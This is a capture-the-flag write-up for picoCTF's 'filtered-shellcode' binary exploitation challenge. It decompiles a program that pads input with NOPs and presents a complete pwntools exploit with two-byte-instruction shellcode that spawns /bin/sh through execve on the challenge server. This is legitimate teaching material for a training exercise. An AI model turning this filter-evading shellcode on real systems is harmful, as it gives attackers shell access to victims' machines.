# Writeup - filtered-shellcode
Category: Binary Exploitation, Points: 160


## Descpriton

> A program that just runs the code you give it? That seems kinda boring... 

We can connect to it with ` nc mercury.picoctf.net 37853` and a 32-bit binary file is shared.


## Vulnerability

If we decompile the binary through `ghidra` we get two functions inside the file. `main` and `execute`. The `main` function simply reads input character by character but the `execute` function is important.

Code for the `execute` function.

```c
void execute(int shellcode,int len)
{
  uint uVar1;
  undefined4 uStack48;
  undefined auStack44 [8];
  undefined *local_24;
  undefined *local_20;
  uint local_1c;
  uint double_len;
  int local_14;
  uint i;
  int j;
  int start;
  
  uStack48 = 0x8048502;
  if ((shellcode != 0) && (len != 0)) {
    double_len = len * 2;
    local_1c = double_len;
    start = ((double_len + 0x10) / 0x10) * -0x10;
    local_20 = auStack44 + start;
    local_14 = 0;
    for (i = 0; j = local_14, i < double_len; i = i + 1) {
      uVar1 = (uint)((int)i >> 0x1f) >> 0x1e;
      if ((int)((i + uVar1 & 3) - uVar1) < 2) {
        local_14 = local_14 + 1;
        auStack44[i + start] = *(undefined *)(shellcode + j);
      }
      else {
        auStack44[i + start] = 0x90;
      }
    }
    auStack44[double_len + start] = 0xc3;
    local_24 = auStack44 + start;
    *(undefined4 *)(auStack44 + start + -4) = 0x80485cb;
    (*(code *)(auStack44 + start))();
    return;
  }
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

This function basically runs shellcode, except if for every 2 bytes of shellcode it replaces the bytes with `0x90`. `0x90` means `nop`. So, if our shellcode is just written as is. It would be replaced with `0x90` for every 2 bytes.

Hence, our shellcode must have instructions that are at most 2 bytes long. 

The main idea is to call `execve("//bin/sh", NULL, NULL)`. But to do this successfully, our shellcode has to have 2-byte instructions. 

We can do this by converting assembly code into shellcode, with `pwntools`. So the main task is to come up with the assembly code to call `execve("//bin/sh", NULL, NULL)`.


## Exploit

The hard part is not calling `//bin/sh` with `execve`. It is writing the shellcode.

For context. `eax, ebx, ecx, edx` are general purpose registers. Each register has a purpose. With respect to the problem at hand `eax` acts like the function invoker. `ebx` is generally the first argument to the function, then `ecx` is second, `edx` is third so on.

To know more about 32-bit calling conventions. Visit this [page](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit)

The basic plan:

1. Push `//bin/sh` on to the stack, so that `esp` points to it.
2. Put `//bin/sh` into the `ebx` register and assign `ecx` and `edx` to `0`.
3. `mov al, 11`. `11` is the 32-bit syscall for `execve`. This moves `execve` to `eax`.
4. `int 0x80` to call `execve` which would have `ebx` as its first argument.

```assembly
; Push //bin/sh on stack (one more slash to avoid null byte)
xor eax, eax
push eax
push `n/sh`
push `//bi`

; Set parameters
mov ebx, esp
xor ecx, ecx
xor edx, edx

; call execve
mov al, 11
int 0x80

; exit
mov al, 1
xor ebx, ebx
int 0x80
```

Now this is quite straightforward except that we need create 2-byte instruction shellcode.

Let's focus on how to trim each instruction to 2-bytes. If we now dig deeper into assembly x86, for each GP register, we have a way the data is stored.

```console
eax -> 00000000 00000000 00000000 00000000 
## If we set eax to something, say 104 -> mov al, 104
eax -> 00000000 00000000 00000000 00000104
## eax is 32 bit or 4 bytes long
## So, if can move the value towards the MSB we would have a 2-byte instruction.
```

To make a 2 byte instruction in `eax` we should keep multiplying `eax` into `16*16`. Since the binary for `256` is `100000000`, this would shift the value in `eax` by 8 bits. Which would inturn do this.

```console
eax -> 00000000 00000000 00000104 00000000
## Now eax contains a 2-byte instruction
```

Here is the final exploit.

```python
## this code is shamelessly copied - the refrence link has the original

import sys

from pwn import *

shellcode = """
/* set all GPRs to 0 */
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

/* set the lower bit ebx to 16 */
mov bl, 16

/* push nop to esp */
push ecx
nop

/* n/sh -> (110, 47, 115, 104) */
mov al, 104
mul ebx
mul ebx
mov al, 115
mul ebx
mul ebx
mov al, 47
mul ebx
mul ebx
mov al, 110
push eax
nop

/* //bi -> (47, 47, 98, 105) */
xor eax, eax
mov al, 105
mul ebx
mul ebx
mov al, 98
mul ebx
mul ebx
mov al, 47
mul ebx
mul ebx
mov al, 47
push eax
nop

/* syscall to execve (eax ebx) */
xor eax, eax
mov al, 11
mov ebx, esp
int 0x80

/* exit call to set ebx to 0*/
mov al, 1
xor ebx, ebx
int 0x80
"""

print(asm(shellcode))

sh = remote("mercury.picoctf.net", "37853") if sys.argv[1] == "remote" else process("./fun")
sh.recvuntil("run:")
sh.sendline(asm(shellcode))
sh.interactive()
```

You should get the flag.


## Reference
[Link](https://github.com/apoirrier/CTFs-writeups/blob/master/PicoCTF/Pwn/filtered-shellcode.md)

